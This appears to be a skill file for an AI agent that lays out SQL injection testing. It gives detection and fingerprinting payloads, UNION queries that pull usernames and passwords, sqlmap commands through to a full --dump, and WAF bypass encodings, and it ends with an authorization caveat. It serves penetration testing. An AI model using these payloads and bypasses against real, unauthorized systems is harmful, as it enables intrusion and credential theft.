---
name: sql-injection-testing
Description: Professional skills and methodologies for SQL injection testing
version: 1.0.0
---

#SQL injection testing skills

## Overview

SQL injection is a common and dangerous web application vulnerability. This skill provides systematic SQL injection testing methods, detection techniques and utilization strategies.

## Test method

### 1. Parameter identification
- Identify all user input points: URL parameters, POST data, HTTP headers, cookies, etc.
- Focus on: id, search, filter, sort and other parameters
- Use Burp Suite or similar tools to intercept and modify requests

### 2. Basic detection
- Single quote test: `''` - See if SQL errors occur
- Boolean blind annotation: `' AND '1'='1` vs `' AND '1'='2`
- Time blind: `' AND SLEEP(5)--`
- Union query: `' UNION SELECT NULL--`

### 3. Database identification
- MySQL：`' AND @@version LIKE '%mysql%'--`
- PostgreSQL：`' AND version() LIKE '%PostgreSQL%'--`
- MSSQL：`' AND @@version LIKE '%Microsoft%'--`
- Oracle：`' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%'--`

### 4. Information extraction
- Database name: `' UNION SELECT database()--`
- Table name: `' UNION SELECT table_name FROM information_schema.tables--`
- Column name: `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--`
- Data extraction: `' UNION SELECT username,password FROM users--`

## Tool usage

### sqlmap
```bash
#Basic scan
sqlmap -u "http://target.com/page?id=1"

# Specify parameters
sqlmap -u "http://target.com/page" --data="id=1" --method=POST

#Specify database type
sqlmap -u "http://target.com/page?id=1" --dbms=mysql

# Get the database list
sqlmap -u "http://target.com/page?id=1" --dbs

# Get table
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Get data
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
```

### Manual testing
- Use Burp Suite’s Repeater module
- Use browser developer tools
-Write Python scripts to automate tests

## Bypass technology

### WAF Bypass
- Encoding bypass: URL encoding, Unicode encoding, hexadecimal encoding
- Comment bypass: `/**/`, `--`, `#`
- Mixed case: `SeLeCt`, `UnIoN`
- Space replacement: `/**/`, `+`, `%09`(Tab), `%0A`(line feed)

### Example
```
Original: ' UNION SELECT NULL--
Bypass 1: '/**/UNION/**/SELECT/**/NULL--
Bypass 2: '%55nion%20select%20null--
Bypass 3: '/*!UNION*//*!SELECT*/null--
```

## Validation and reporting

### Verification steps
1. Confirm that SQL statements can be executed
2. Extract database information for verification
3. Assess the scope of impact (data leakage, privilege escalation, etc.)
4. Document the complete POC (request/response)

### Report Highlights
- Vulnerability location and parameters
-Affected data and systems
- Complete utilization steps
- Fix suggestions (parameterized queries, input validation, etc.)

## Notes

- Only conducted in an authorized testing environment
- Avoid damage to production data
- Use DROP, DELETE and other dangerous operations with caution
- Record all test steps for reproducibility
